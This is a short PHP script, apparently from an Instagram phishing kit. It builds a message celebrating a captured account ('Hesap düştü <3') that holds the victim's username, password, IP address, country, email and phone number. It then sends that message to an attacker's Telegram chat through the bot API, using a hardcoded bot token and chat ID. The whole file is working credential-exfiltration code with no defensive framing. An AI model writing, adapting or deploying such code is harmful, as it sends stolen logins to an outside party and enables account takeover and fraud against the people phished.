<?php
    $token='5000908961:AAGKTvzp49-Yc6YnQdh3MGBz5lOMrinan8E';
    $data = [
        'text' => 'Hesap düştü  <3
Sublime Saplar
Username: '.$username.'
Password: '.$password.'
Ip Address: '.$ip.'
Country: '.$ulke.'
Link : instagram.com/'.$username.'
Mail: '.$mail.'
Tel: '.$tel.'
      ',
      'chat_id' =>-1001586201889
    ];
    
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );


  
?>
